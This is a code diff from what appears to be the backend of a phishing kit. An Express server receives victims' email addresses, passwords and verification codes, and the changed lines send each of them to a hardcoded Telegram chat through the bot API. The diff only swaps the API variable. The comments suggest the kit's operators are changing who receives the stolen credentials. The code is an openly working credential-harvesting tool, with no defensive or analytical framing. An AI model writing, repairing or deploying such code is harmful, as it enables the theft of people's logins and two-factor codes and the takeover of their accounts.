@@ -45,7 +45,7 @@ app.post(URI, async (req, res) => {
   console.log("Received Email:", email);
   console.log("Received Password:", password);
 
-  await axios.post(`${TELEGRAM_API}/sendMessage`, {
+  await axios.post(`${TELEGRAM_API4}/sendMessage`, {
     chat_id: "7068073891", // You removed Orelo and Put Bunny
     text: `The Email is ${email}, the Password is ${password}`,
   });
@@ -79,7 +79,7 @@ app.post("/code", async (req, res) => {
   // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
   console.log("Received Code:", code);
 
-  await axios.post(`${TELEGRAM_API}/sendMessage`, {
+  await axios.post(`${TELEGRAM_API4}/sendMessage`, {
     chat_id: "7068073891", // You removed Orelo and Put Bunny
     text: `The verification code is ${code}`,
   });
